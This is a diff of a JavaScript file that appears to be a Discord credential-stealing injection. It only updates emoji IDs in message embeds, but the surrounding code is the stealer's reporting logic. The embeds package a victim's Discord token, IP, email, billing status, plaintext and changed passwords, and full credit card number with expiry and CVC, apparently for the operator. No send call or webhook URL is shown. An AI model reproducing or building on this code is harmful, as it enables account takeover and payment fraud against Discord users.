@@ -272,37 +272,37 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:1336:1012706914527891476> Token:",
+                        name: "<a:1336:1028341501241077841> Token:",
                         value: `\`${token}\``,
                         inline: false
                     },
                     {
-                        name: "<:1336:1012707124763177022> Badges:",
+                        name: "<:1336:1028342297638740119> Badges:",
                         value: `\`${getBadges(userInfo.flags)}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        name: "<:1336:1028342301581385728> Nitro Type:",
                         value: `\`${getNitro(userInfo.premium_type)}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1012707511830331442> Billing:",
+                        name: "<a:1336:1028341499823394816> Billing:",
                         value: `\`${billing}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707773424865310> IP:",
+                        name: "<:1336:1028342302948733038> IP:",
                         value: `\`${ip}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707970653626408> Email:",
+                        name: "<:1336:1028342299882688563> Email:",
                         value: `\`${email}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1026131787157602375> Credit card:",
+                        name: "<a:1336:1028342682457743431> Credit card:",
                         value: `\`${number}|${month}|${year}|${cvc}\``,
                         inline: false
                     },
@@ -341,37 +341,37 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:1336:1012706914527891476> Token:",
+                        name: "<a:1336:1028341501241077841> Token:",
                         value: `\`${token}\``,
                         inline: false
                     },
                     {
-                        name: "<:1336:1012707124763177022> Badges:",
+                        name: "<:1336:1028342297638740119> Badges:",
                         value: `\`${getBadges(userInfo.flags)}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        name: "<:1336:1028342301581385728> Nitro Type:",
                         value: `\`${getNitro(userInfo.premium_type)}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1012707511830331442> Billing:",
+                        name: "<a:1336:1028341499823394816> Billing:",
                         value: `\`${billing}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707773424865310> IP:",
+                        name: "<:1336:1028342302948733038> IP:",
                         value: `\`${ip}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707970653626408> Email:",
+                        name: "<:1336:1028342299882688563> Email:",
                         value: `\`${email}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1026125680330678354> Password:",
+                        name: "<a:1336:1028341498602848336> Password:",
                         value: `\`${password}\``,
                         inline: true
                     },
@@ -410,37 +410,37 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:1336:1012706914527891476> Token:",
+                        name: "<a:1336:1028341501241077841> Token:",
                         value: `\`${token}\``,
                         inline: false
                     },
                     {
-                        name: "<:1336:1012707124763177022> Badges:",
+                        name: "<:1336:1028342297638740119> Badges:",
                         value: `\`${getBadges(userInfo.flags)}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        name: "<:1336:1028342301581385728> Nitro Type:",
                         value: `\`${getNitro(userInfo.premium_type)}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1012707511830331442> Billing:",
+                        name: "<a:1336:1028341499823394816> Billing:",
                         value: `\`${billing}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707773424865310> IP:",
+                        name: "<:1336:1028342302948733038> IP:",
                         value: `\`${ip}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707970653626408> Email:",
+                        name: "<:1336:1028342299882688563> Email:",
                         value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1026125680330678354> Password:",
+                        name: "<a:1336:1028341498602848336> Password:",
                         value: `\`${password}\``,
                         inline: true
                     },
@@ -479,42 +479,42 @@ var event_handlers = {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:1336:1012706914527891476> Token:",
+                        name: "<a:1336:1028341501241077841> Token:",
                         value: `\`${token}\``,
                         inline: false
                     },
                     {
-                        name: "<:1336:1012707124763177022> Badges:",
+                        name: "<:1336:1028342297638740119> Badges:",
                         value: `\`${getBadges(userInfo.flags)}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707326223982692> Nitro Type:",
+                        name: "<:1336:1028342301581385728> Nitro Type:",
                         value: `\`${getNitro(userInfo.premium_type)}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1012707511830331442> Billing:",
+                        name: "<a:1336:1028341499823394816> Billing:",
                         value: `\`${billing}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707773424865310> IP:",
+                        name: "<:1336:1028342302948733038> IP:",
                         value: `\`${ip}\``,
                         inline: true
                     },
                     {
-                        name: "<:1336:1012707970653626408> Email:",
+                        name: "<:1336:1028342299882688563> Email:",
                         value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1026125680330678354> Old Password:",
+                        name: "<a:1336:1028341498602848336> Old Password:",
                         value: `\`${oldPassword}\``,
                         inline: true
                     },
                     {
-                        name: "<a:1336:1026125680330678354> New Password:",
+                        name: "<a:1336:1028341498602848336> New Password:",
                         value: `\`${newPassword}\``,
                         inline: false
                     },
@@ -703,32 +703,32 @@ async function initialize() {
                     embeds: [createEmbed({
                         title: "Client initialized (not logged in)",
                         fields: [{
-                            name: "<a:1336:1012706914527891476> Token:",
+                            name: "<a:1336:1028341501241077841> Token:",
                             value: `\`${token}\``,
                             inline: false
                         },
                         {
-                            name: "<:1336:1012707124763177022> Badges:",
+                            name: "<:1336:1028342297638740119> Badges:",
                             value: `\`${getBadges(userInfo.flags)}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            name: "<:1336:1028342301581385728> Nitro Type:",
                             value: `\`${getNitro(userInfo.premium_type)}\``,
                             inline: true
                         },
                         {
-                            name: "<a:1336:1012707511830331442> Billing:",
+                            name: "<a:1336:1028341499823394816> Billing:",
                             value: `\`${billing}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707773424865310> IP:",
+                            name: "<:1336:1028342302948733038> IP:",
                             value: `\`${ip}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707970653626408> Email:",
+                            name: "<:1336:1028342299882688563> Email:",
                             value: `\`${email}\``,
                             inline: true
                         }],
@@ -753,32 +753,32 @@ async function initialize() {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                            name: "<a:1336:1012706914527891476> Token:",
+                            name: "<a:1336:1028341501241077841> Token:",
                             value: `\`${token}\``,
                             inline: false
                         },
                         {
-                            name: "<:1336:1012707124763177022> Badges:",
+                            name: "<:1336:1028342297638740119> Badges:",
                             value: `\`${getBadges(userInfo.flags)}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            name: "<:1336:1028342301581385728> Nitro Type:",
                             value: `\`${getNitro(userInfo.premium_type)}\``,
                             inline: true
                         },
                         {
-                            name: "<a:1336:1012707511830331442> Billing:",
+                            name: "<a:1336:1028341499823394816> Billing:",
                             value: `\`${billing}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707773424865310> IP:",
+                            name: "<:1336:1028342302948733038> IP:",
                             value: `\`${ip}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707970653626408> Email:",
+                            name: "<:1336:1028342299882688563> Email:",
                             value: `\`${email}\``,
                             inline: true
                         }
@@ -815,32 +815,32 @@ async function initialize() {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                            name: "<a:1336:1012706914527891476> Token:",
+                            name: "<a:1336:1028341501241077841> Token:",
                             value: `\`${token}\``,
                             inline: false
                         },
                         {
-                            name: "<:1336:1012707124763177022> Badges:",
+                            name: "<:1336:1028342297638740119> Badges:",
                             value: `\`${getBadges(userInfo.flags)}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707326223982692> Nitro Type:",
+                            name: "<:1336:1028342301581385728> Nitro Type:",
                             value: `\`${getNitro(userInfo.premium_type)}\``,
                             inline: true
                         },
                         {
-                            name: "<a:1336:1012707511830331442> Billing:",
+                            name: "<a:1336:1028341499823394816> Billing:",
                             value: `\`${billing}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707773424865310> IP:",
+                            name: "<:1336:1028342302948733038> IP:",
                             value: `\`${ip}\``,
                             inline: true
                         },
                         {
-                            name: "<:1336:1012707970653626408> Email:",
+                            name: "<:1336:1028342299882688563> Email:",
                             value: `\`${email}\``,
                             inline: true
                         },]
